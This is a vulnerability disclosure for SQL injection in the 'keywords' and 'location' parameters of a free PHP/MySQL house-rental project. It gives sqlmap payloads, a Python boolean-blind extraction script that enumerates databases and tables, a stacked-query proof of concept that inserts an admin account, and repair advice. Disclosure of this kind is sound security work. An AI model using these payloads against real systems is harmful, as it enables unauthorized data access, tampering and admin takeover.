# PROJECTSWORLDS House rental And Property Listing Project PHP , Mysql V1.0 /index.php SQL injection
# NAME OF AFFECTED PRODUCT(S)
+ House rental And Property Listing Project PHP , Mysql

## Vendor Homepage
+ [homepage](https://projectworlds.in/free-projects/php-projects/house-rental-and-property-listing-project-php-mysql/)

# AFFECTED AND/OR FIXED VERSION(S)
## submitter
+ takakie

## Vulnerable File
+ /index.php

## VERSION(S)
+ V1.0

# Software Link
+ [Download Source Code](https://projectworlds.in/wp-content/uploads/2019/06/home-rental.zip)

# PROBLEM TYPE
## Vulnerability Type
+ SQL injection

## Root Cause
+ A SQL injection vulnerability was found in the '/index.php' file of the 'House rental And Property Listing Project' project. The reason for this issue is that attackers inject malicious code from the parameters 'keywords','location' and use it directly in SQL queries without the need for appropriate cleaning or validation. This allows attackers to forge input values, thereby manipulating SQL queries and performing unauthorized operations.

## Impact
+ Attackers can exploit this SQL injection vulnerability to achieve unauthorized database access, sensitive data leakage, data tampering, comprehensive system control, and even service interruption, posing a serious threat to system security and business continuity.

## DESCRIPTION
+ During the security review of "House rental And Property Listing Project", takakie discovered a critical SQL injection vulnerability in the "/index.php" file. This vulnerability stems from insufficient user input validation of the 'keywords' parameter and 'location', allowing attackers to inject malicious SQL queries. Therefore, attackers can gain unauthorized access to databases, modify or delete data, and access sensitive information. Immediate remedial measures are needed to ensure system security and protect data integrity.

# No login or authorization is required to exploit this vulnerability  details and POC

## Vulnerability type:

+ boolean-based blind
+ time-based blind
+ stacked queries

## Vulnerability location:
+ 'keywords' parameter and 'location' parameter

## Payload:
```bash
---
Parameter: #1* ((custom) POST)
    Type: boolean-based blind
    Title: AND boolean-based blind - WHERE or HAVING clause
    Payload: keywords=') AND 3038=3038 AND ('BCbi'='BCbi&location=&search=search

    Type: stacked queries
    Title: MySQL >= 5.0.12 stacked queries (comment)
    Payload: keywords=');SELECT SLEEP(5)#&location=&search=search

    Type: time-based blind
    Title: MySQL >= 5.0.12 OR time-based blind (SLEEP - comment)
    Payload: keywords=') OR SLEEP(5)#&location=&search=search
---

---
Parameter: #1* ((custom) POST)
    Type: boolean-based blind
    Title: AND boolean-based blind - WHERE or HAVING clause
    Payload: keywords=&location=india') AND 2543=2543 AND ('vOQw'='vOQw&search=search

    Type: stacked queries
    Title: MySQL >= 5.0.12 stacked queries (comment)
    Payload: keywords=&location=india');SELECT SLEEP(5)#&search=search

    Type: time-based blind
    Title: MySQL >= 5.0.12 AND time-based blind (SLEEP)
    Payload: keywords=&location=india') AND SLEEP(5) AND ('qSUX'='qSUX&search=search
---
```

## The following are screenshots of some specific information obtained from testing and running with the sqlmap tool:
```bash
sqlmap -r newrent_sql.txt --dbms=mysql --dbs --batch 
```

![image-20250313101447955](https://hongkong-img.oss-cn-hongkong.aliyuncs.com/markdown-img/image-20250313101447955.png?x-oss-process=style/img-to-webp)

![image-20250313193520322](https://hongkong-img.oss-cn-hongkong.aliyuncs.com/markdown-img/image-20250313193520322.png?x-oss-process=style/img-to-webp)

- "Due to the system using $keyword = explode(',', $keywords); for parameter processing, commas (,) cannot be utilized. Therefore, I developed the following Proof of Concept (PoC):" 
- boolean-based blind

```python
import requests

if __name__ == '__main__':
    # your target url
    url = "http://192.168.100.147/index.php"
    database_info = ""
    country = "india" # The country parameter value must exist in the system. You can send an empty parameter query to get it.
    length = 0
    # query all tables in the database
    sql1 = "SELECT group_concat(table_name) FROM information_schema.TABLES WHERE table_schema = DATABASE()"
    # query all database
    sql2 = "select group_concat(schema_name) from information_schema.schemata"

    for i in range(1, 999):
        for c in range(32, 127):
            payload = f"{country}') AND ASCII(SUBSTR(({sql2} LIMIT 1 OFFSET 0) FROM {i} FOR 1))={c} -- "
            keywords = payload
            location = "" # if you want to attack 'location' parameter you can set 'location = payload'
            data = {
                "keywords": keywords,
                "location": location,
                "search": "search"
            }
            r = requests.post(url, data)
            if len(r.text) > 6000:
                if c == 44:
                    print("Database_info:", database_info)
                    database_info = ""
                else:
                    database_info += chr(c)
                break

        if len(database_info) == length:
            break
        length = len(database_info)
    print("Database_info:", database_info)


```

![image-20250313103633628](https://hongkong-img.oss-cn-hongkong.aliyuncs.com/markdown-img/image-20250313103633628.png?x-oss-process=style/img-to-webp)

![image-20250313103747890](https://hongkong-img.oss-cn-hongkong.aliyuncs.com/markdown-img/image-20250313103747890.png?x-oss-process=style/img-to-webp)

- stacked queries; insert a user of admin role
- Poc

```sql
keywords=india');INSERT INTO users SELECT * FROM (SELECT 3)a CROSS JOIN (SELECT 'systest')b CROSS JOIN (SELECT '15661561521')c CROSS JOIN (SELECT 'test')d CROSS JOIN (SELECT 'user1@gmail.com')e CROSS JOIN (SELECT md5('123456'))f CROSS JOIN (SELECT NOW())g CROSS JOIN (SELECT NOW())h CROSS JOIN (SELECT 'admin')j CROSS JOIN (SELECT 1)k; #
&location=
&search=search
```

![image-20250313111731407](https://hongkong-img.oss-cn-hongkong.aliyuncs.com/markdown-img/image-20250313111731407.png?x-oss-process=style/img-to-webp)

![image-20250313112300781](./image-20250313112300781.png)

![image-20250313112051653](https://hongkong-img.oss-cn-hongkong.aliyuncs.com/markdown-img/image-20250313112051653.png?x-oss-process=style/img-to-webp)

# Suggested repair
1. Use prepared statements and parameter binding:  
Preparing statements can prevent SQL injection as they separate SQL code from user input data. When using prepare statements, the value entered by the user is treated as pure data and will not be interpreted as SQL code.
2. Input validation and filtering:  
Strictly validate and filter user input data to ensure it conforms to the expected format.
3. Minimize database user permissions:  
Ensure that the account used to connect to the database has the minimum necessary permissions. Avoid using accounts with advanced permissions (such as' root 'or' admin ') for daily operations.
4. Regular security audits:  
Regularly conduct code and system security audits to promptly identify and fix potential security vulnerabilities.

